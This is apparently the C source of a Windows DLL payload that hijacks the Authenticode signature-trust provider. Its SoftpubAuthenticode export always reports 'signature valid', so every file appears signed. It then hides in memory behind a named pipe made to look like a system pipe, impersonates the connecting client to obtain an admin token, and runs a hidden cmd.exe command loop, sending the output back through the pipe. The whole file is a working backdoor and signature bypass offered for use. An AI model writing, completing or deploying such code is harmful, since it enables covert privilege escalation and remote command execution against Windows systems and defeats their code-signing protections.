/*
 * sipexec_payload_impersonate.c — Named pipe impersonation + non-blocking FinalPolicy
 *
 * FinalPolicy returns S_OK immediately ("signature valid") while pipe_worker
 * runs in background. Self-loads to prevent unload after WVT returns.
 * Result: the DLL itself and everything else appears validly signed during
 * the hijack window, with zero added latency.
 */
#include <windows.h>
#include <stdio.h>

static volatile LONG g_ran = 0;
static HANDLE g_thread = NULL;
static HANDLE g_pinned = NULL;  /* signaled once DLL refcount is bumped */
static HMODULE g_hSelf = NULL;

#define PIPE_DONE "\n[DONE]\n"

static unsigned int fnv1a(const char *s) {
    unsigned int h = 2166136261u;
    for (; *s; s++) { h ^= (unsigned char)*s; h *= 16777619u; }
    return h;
}

static HANDLE make_pipe(const char *name) {
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    SECURITY_ATTRIBUTES sa = {sizeof(sa), &sd, FALSE};
    return CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, 65536, 65536, 30000, &sa);
}

static DWORD WINAPI pipe_worker(LPVOID p) {
    char dllPath[MAX_PATH] = {0};
    GetModuleFileNameA(g_hSelf, dllPath, MAX_PATH);

    /* Pin ourselves in memory so WVT can return without unloading us */
    HMODULE hPin = NULL;
    LoadLibraryA(dllPath);
    SetEvent(g_pinned);  /* tell export it's safe to return S_OK */

    char *base = dllPath;
    for (char *q = dllPath; *q; q++)
        if (*q == '\\' || *q == '/') base = q + 1;
    char basename[MAX_PATH];
    int i;
    for (i = 0; base[i]; i++)
        basename[i] = (base[i] >= 'A' && base[i] <= 'Z') ? base[i] + 32 : base[i];
    basename[i] = '\0';

    char pipeName[256];
    snprintf(pipeName, sizeof(pipeName), "\\\\.\\pipe\\wkssvc_%08x", fnv1a(basename));

    HANDLE hp = make_pipe(pipeName);
    if (hp == INVALID_HANDLE_VALUE) {
        FreeLibraryAndExitThread(g_hSelf, 1);
        return 1;
    }

    OVERLAPPED ov = {0};
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hp, &ov);
    if (WaitForSingleObject(ov.hEvent, 120000) != WAIT_OBJECT_0) {
        CloseHandle(ov.hEvent); CloseHandle(hp);
        FreeLibraryAndExitThread(g_hSelf, 1);
        return 1;
    }
    CloseHandle(ov.hEvent);

    /* Impersonate the pipe client → get admin token */
    HANDLE hImpToken = NULL;
    BOOL hasToken = FALSE;
    if (ImpersonateNamedPipeClient(hp)) {
        if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY,
                            TRUE, &hImpToken)) {
            hasToken = TRUE;
        }
        RevertToSelf();
    }

    /* Greeting */
    char hi[128];
    DWORD w;
    int hlen = snprintf(hi, sizeof(hi), "OK %lu imp=%d\n",
                        GetCurrentProcessId(), hasToken);
    WriteFile(hp, hi, hlen, &w, NULL);

    /* Command loop */
    for (;;) {
        char cmd[8192] = {0};
        DWORD n = 0;
        if (!ReadFile(hp, cmd, sizeof(cmd)-1, &n, NULL) || n == 0) break;
        cmd[n] = '\0';
        while (n > 0 && (cmd[n-1]=='\r' || cmd[n-1]=='\n')) cmd[--n] = '\0';
        if (_stricmp(cmd, "exit") == 0 || _stricmp(cmd, "quit") == 0) break;

        SECURITY_ATTRIBUTES psa = {sizeof(psa), NULL, TRUE};
        HANDLE hReadPipe, hWritePipe;
        CreatePipe(&hReadPipe, &hWritePipe, &psa, 0);
        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

        char fullCmd[16384];
        snprintf(fullCmd, sizeof(fullCmd), "cmd.exe /c %s", cmd);

        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = hWritePipe;
        si.hStdError = hWritePipe;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        PROCESS_INFORMATION pi = {0};
        BOOL ok = FALSE;

        if (hasToken) {
            HANDLE hPrimary = NULL;
            if (DuplicateTokenEx(hImpToken, MAXIMUM_ALLOWED, NULL,
                                 SecurityDelegation, TokenPrimary, &hPrimary)) {
                ImpersonateLoggedOnUser(hImpToken);
                ok = CreateProcessAsUserA(hPrimary, NULL, fullCmd, NULL, NULL,
                                          TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                RevertToSelf();
                CloseHandle(hPrimary);
            }
        }

        if (!ok) {
            ok = CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE,
                                CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        }

        CloseHandle(hWritePipe);

        if (ok) {
            char buf[4096];
            DWORD rd;
            while (ReadFile(hReadPipe, buf, sizeof(buf), &rd, NULL) && rd > 0)
                WriteFile(hp, buf, rd, &w, NULL);
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        CloseHandle(hReadPipe);
        WriteFile(hp, PIPE_DONE, sizeof(PIPE_DONE)-1, &w, NULL);
    }

    DisconnectNamedPipe(hp);
    CloseHandle(hp);
    if (hImpToken) CloseHandle(hImpToken);

    /* Unpin — DLL will unload when wmiprvse's cache expires */
    FreeLibraryAndExitThread(g_hSelf, 0);
    return 0;  /* unreachable */
}

static void start(void) {
    if (InterlockedCompareExchange(&g_ran, 1, 0) != 0) return;
    g_pinned = CreateEvent(NULL, TRUE, FALSE, NULL);
    g_thread = CreateThread(NULL, 0, pipe_worker, NULL, 0, NULL);
}

/* ponytail: FinalPolicy returns S_OK immediately — "signature valid" for everything.
 * Only waits for the self-pin (LoadLibrary) to complete (~0ms), not the pipe loop.
 * Named SoftpubAuthenticode to match wintrust.dll's original — only $DLL needs hijacking. */
__declspec(dllexport)
long __stdcall SoftpubAuthenticode(void *prov) {
    start();
    if (g_pinned) WaitForSingleObject(g_pinned, 5000);
    return 0;  /* S_OK = valid signature */
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    if (r == DLL_PROCESS_ATTACH) { g_hSelf = h; start(); }
    return TRUE;
}
